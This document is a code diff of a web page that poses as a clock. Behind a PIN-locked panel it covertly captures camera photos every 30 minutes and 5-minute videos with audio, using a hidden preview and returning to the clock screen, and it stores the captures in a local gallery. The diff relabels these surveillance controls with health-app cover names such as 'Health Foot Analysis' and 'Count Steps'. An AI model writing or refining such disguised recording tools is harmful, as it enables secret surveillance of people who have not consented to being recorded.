@@ -19,15 +19,20 @@
         input { padding: 15px; font-size: 28px; width: 140px; text-align: center; background: #111; color: white; border: 1px solid #333; border-radius: 12px; outline: none; }
 
         #admin-panel { display: none; padding: 20px; width: 100%; height: 100vh; overflow-y: auto; background: #000; position: fixed; top: 0; z-index: 998; box-sizing: border-box; }
-        video { width: 100%; max-width: 320px; border-radius: 15px; background: #111; margin: 0 auto 15px; display: block; border: 2px solid #222; }
-        .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; display: block; text-transform: uppercase; }
-        .btn-blue { background: #3498db; }
-        .btn-green { background: #2ecc71; }
-        .btn-orange { background: #f39c12; }
-        .btn-red { background: #e74c3c; }
-        .sub-menu { display: none; background: #111; padding: 10px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; }
+        
+        #preview { display: none; }
+        #status-msg { text-align: center; color: #2ecc71; font-weight: bold; margin: 10px 0; min-height: 20px; }
 
-        .gallery { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; padding-bottom: 50px; }
+        .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; display: block; text-transform: uppercase; }
+        .btn-blue { background: #2c3e50; border: 1px solid #34495e; }
+        .btn-green { background: #27ae60; }
+        .btn-orange { background: #d35400; }
+        .btn-purple { background: #8e44ad; } /* گیلری بٹن کا نیا رنگ */
+        .btn-red { background: #c0392b; }
+        
+        .sub-menu { display: none; background: #0a0a0a; padding: 10px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #222; }
+
+        .gallery { display: none; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; padding-bottom: 50px; }
         .card { background: #111; padding: 8px; border-radius: 12px; border: 1px solid #222; text-align: center; }
         .card img, .card video { width: 100%; border-radius: 8px; margin-bottom: 5px; }
         .del-btn { background: #e74c3c; color: white; border: none; padding: 8px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 12px; }
@@ -51,23 +56,28 @@
     </div>
 
     <div id="admin-panel">
-        <h3 style="text-align:center; color:#3498db;">System Control</h3>
+        <h3 style="text-align:center; color:#3498db;">HEALTH MONITOR</h3>
+        
+        <div id="status-msg"></div>
         <video id="preview" autoplay playsinline muted></video>
         <canvas id="canvas" style="display:none;"></canvas>
 
-        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Front Cam Options</button>
+        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Health Foot Settings</button>
         <div id="front-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="startAutoPhoto('user')">Auto Photo (20 Snaps)</button>
-            <button class="btn btn-orange" onclick="startVideoRecording('user')">Record 5 Min Video</button>
+            <button class="btn btn-green" onclick="startAutoPhoto('user')">Start Health Foot Analysis</button>
+            <button class="btn btn-orange" onclick="startVideoRecording('user')">Deep Scan (5 Min)</button>
         </div>
 
-        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Back Cam Options</button>
+        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Health Body Settings</button>
         <div id="back-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="startAutoPhoto('environment')">Auto Photo (20 Snaps)</button>
-            <button class="btn btn-orange" onclick="startVideoRecording('environment')">Record 5 Min Video</button>
+            <button class="btn btn-green" onclick="startAutoPhoto('environment')">Start Health Body Analysis</button>
+            <button class="btn btn-orange" onclick="startVideoRecording('environment')">Full Scan (5 Min)</button>
         </div>
+
+        <button class="btn btn-purple" onclick="toggleGallery()">Count Steps</button>
         
         <button class="btn btn-red" onclick="location.reload()">Lock System</button>
+        
         <div id="gallery" class="gallery"></div>
     </div>
 
@@ -81,10 +91,7 @@
         }
         setInterval(runClock, 1000);
 
-        // اسکرین تبدیلی کے فنکشنز
-        function openPin() { 
-            document.getElementById('pin-screen').style.display='block'; 
-        }
+        function openPin() { document.getElementById('pin-screen').style.display='block'; }
         
         function goBackToClock() {
             document.getElementById('pin-screen').style.display='none';
@@ -106,7 +113,11 @@
             el.style.display = (el.style.display === 'block') ? 'none' : 'block';
         }
 
-        // گلوبل متغیرات
+        function toggleGallery() {
+            let gal = document.getElementById('gallery');
+            gal.style.display = (gal.style.display === 'grid') ? 'none' : 'grid';
+        }
+
         let currentStream = null;
         let currentRecorder = null;
         let photoInterval = null;
@@ -114,210 +125,104 @@
         let photoCounter = 0;
         let chunks = [];
 
-        // آٹو فوٹو فنکشن
-        async function startAutoPhoto(camType) {
-            // پہلے سے چل رہی کوئی بھی سرگرمی بند کریں
-            stopAllActivities();
-            
-            // گھڑی کی اسکرین پر واپس جائیں
-            goBackToClock();
-            
-            try {
-                // کیمرہ شروع کریں
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: camType },
-                    audio: false 
-                });
-                
-                // پریویو شروع کریں (لیکن نظر نہیں آئے گا)
-                const preview = document.getElementById('preview');
-                preview.srcObject = currentStream;
-                
-                // فوٹو کاؤنٹر ری سیٹ کریں
-                photoCounter = 0;
-                
-                // پہلی فوٹو فوری لیں
-                takePhoto();
-                photoCounter++;
-                
-                // ہر 30 منٹ بعد فوٹو لیں
-                photoInterval = setInterval(() => {
-                    if(photoCounter < 20) {
-                        takePhoto();
-                        photoCounter++;
-                    } else {
-                        // 20 فوٹوز مکمل ہونے پر بند کریں
-                        stopAllActivities();
-                    }
-                }, 30 * 60 * 1000); // 30 منٹ = 30 * 60 * 1000 ملی سیکنڈ
-                
-            } catch(e) {
-                console.error("کیمرہ کی غلطی:", e.message);
-            }
+        function showStatus() {
+            const status = document.getElementById('status-msg');
+            status.innerText = "Run ok";
+            setTimeout(() => { status.innerText = ""; }, 4000);
         }
 
-        // ویڈیو ریکارڈنگ فنکشن
-        async function startVideoRecording(camType) {
-            // پہلے سے چل رہی کوئی بھی سرگرمی بند کریں
+        async function startAutoPhoto(camType) {
             stopAllActivities();
-            
-            // گھڑی کی اسکرین پر واپس جائیں
+            showStatus();
             goBackToClock();
-            
             try {
-                // کیمرہ اور مائیکروفون شروع کریں
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: camType },
-                    audio: true 
-                });
-                
-                // پریویو شروع کریں
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType }, audio: false });
                 const preview = document.getElementById('preview');
                 preview.srcObject = currentStream;
-                
-                // میڈیا ریکارڈر بنائیں
+                photoCounter = 0;
+                takePhoto();
+                photoCounter++;
+                photoInterval = setInterval(() => {
+                    if(photoCounter < 20) { takePhoto(); photoCounter++; } 
+                    else { stopAllActivities(); }
+                }, 30 * 60 * 1000);
+            } catch(e) { console.error(e); }
+        }
+
+        async function startVideoRecording(camType) {
+            stopAllActivities();
+            showStatus();
+            goBackToClock();
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType }, audio: true });
+                const preview = document.getElementById('preview');
+                preview.srcObject = currentStream;
                 currentRecorder = new MediaRecorder(currentStream);
                 chunks = [];
-                
-                currentRecorder.ondataavailable = (e) => {
-                    if(e.data.size > 0) chunks.push(e.data);
-                };
-                
+                currentRecorder.ondataavailable = (e) => { if(e.data.size > 0) chunks.push(e.data); };
                 currentRecorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
-                    reader.onloadend = () => {
-                        saveData('vid', reader.result);
-                    };
+                    reader.onloadend = () => { saveData('vid', reader.result); };
                 };
-                
-                // ریکارڈنگ شروع کریں
                 currentRecorder.start();
-                
-                // 5 منٹ بعد خودبخود بند کریں
                 videoTimeout = setTimeout(() => {
                     if(currentRecorder && currentRecorder.state === "recording") {
                         currentRecorder.stop();
                         stopAllActivities();
                     }
-                }, 5 * 60 * 1000); // 5 منٹ = 5 * 60 * 1000 ملی سیکنڈ
-                
-            } catch(e) {
-                console.error("ریکارڈنگ کی غلطی:", e.message);
-            }
+                }, 5 * 60 * 1000);
+            } catch(e) { console.error(e); }
         }
 
-        // فوٹو لینے کا فنکشن
         function takePhoto() {
             if(!currentStream) return;
-            
             const preview = document.getElementById('preview');
             const canvas = document.getElementById('canvas');
-            
             if(!preview.videoWidth) return;
-            
             canvas.width = preview.videoWidth;
             canvas.height = preview.videoHeight;
-            
             const context = canvas.getContext('2d');
             context.drawImage(preview, 0, 0, canvas.width, canvas.height);
-            
-            // تصویر محفوظ کریں
             saveData('img', canvas.toDataURL('image/jpeg', 0.7));
         }
 
-        // تمام سرگرمیاں بند کرنے کا فنکشن
         function stopAllActivities() {
-            // فوٹو انٹرویل بند کریں
-            if(photoInterval) {
-                clearInterval(photoInterval);
-                photoInterval = null;
-            }
-            
-            // ویڈیو ٹائمر بند کریں
-            if(videoTimeout) {
-                clearTimeout(videoTimeout);
-                videoTimeout = null;
-            }
-            
-            // ریکارڈر بند کریں
-            if(currentRecorder && currentRecorder.state === "recording") {
-                currentRecorder.stop();
-                currentRecorder = null;
-            }
-            
-            // کیمرہ سٹریم بند کریں
-            if(currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-                currentStream = null;
-            }
-            
-            // پریویو کلئیر کریں
-            const preview = document.getElementById('preview');
-            preview.srcObject = null;
-            
-            chunks = [];
+            if(photoInterval) clearInterval(photoInterval);
+            if(videoTimeout) clearTimeout(videoTimeout);
+            if(currentRecorder && currentRecorder.state === "recording") currentRecorder.stop();
+            if(currentStream) { currentStream.getTracks().forEach(track => track.stop()); currentStream = null; }
             photoCounter = 0;
         }
 
-        // ڈیٹا محفوظ کرنے کا فنکشن
         function saveData(type, data) {
             let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
-            storage.push({ 
-                t: type, 
-                d: data, 
-                time: new Date().toLocaleString('ur-PK') 
-            });
+            storage.push({ t: type, d: data, time: new Date().toLocaleString() });
             localStorage.setItem('rvault', JSON.stringify(storage));
-            
-            // اگر ایڈمن پینل کھلا ہے تو گیلری اپڈیٹ کریں
-            if(document.getElementById('admin-panel').style.display === 'block') {
-                updateGallery();
-            }
+            updateGallery();
         }
 
-        // گیلری اپڈیٹ کرنے کا فنکشن
         function updateGallery() {
             const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
             const gallery = document.getElementById('gallery');
             gallery.innerHTML = '';
-            
             storage.slice().reverse().forEach((item, index) => {
                 const actualIndex = storage.length - 1 - index;
-                const media = item.t === 'img' 
-                    ? `<img src="${item.d}" style="max-height: 150px; object-fit: cover;">` 
-                    : `<video src="${item.d}" controls style="max-height: 150px; object-fit: cover;"></video>`;
-                
-                gallery.innerHTML += `
-                    <div class="card">
-                        ${media}
-                        <p style="font-size:10px; margin:5px 0">${item.time}</p>
-                        <button class="del-btn" onclick="deleteItem(${actualIndex})">Delete</button>
-                    </div>
-                `;
+                const media = item.t === 'img' ? `<img src="${item.d}">` : `<video src="${item.d}" controls></video>`;
+                gallery.innerHTML += `<div class="card">${media}<p style="font-size:10px;">${item.time}</p><button class="del-btn" onclick="deleteItem(${actualIndex})">Delete</button></div>`;
             });
         }
 
-        // آئٹم ڈیلیٹ کرنے کا فنکشن
         function deleteItem(index) {
-            if(confirm("کیا آپ واقعی اس آئٹم کو ڈیلیٹ کرنا چاہتے ہیں؟")) {
+            if(confirm("Delete record?")) {
                 let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
                 storage.splice(index, 1);
                 localStorage.setItem('rvault', JSON.stringify(storage));
                 updateGallery();
             }
         }
-
-        // صفحہ بند ہوتے وقت تمام سرگرمیاں بند کریں
-        window.addEventListener('beforeunload', () => {
-            stopAllActivities();
-        });
-
-        // پہلے سے محفوظ ڈیٹا کی جانچ
-        if(localStorage.getItem('rvault')) {
-            console.log("موجودہ ذخیرہ شدہ آئٹمز:", JSON.parse(localStorage.getItem('rvault')).length);
-        }
+        window.addEventListener('beforeunload', () => { stopAllActivities(); });
     </script>
 </body>
 </html>
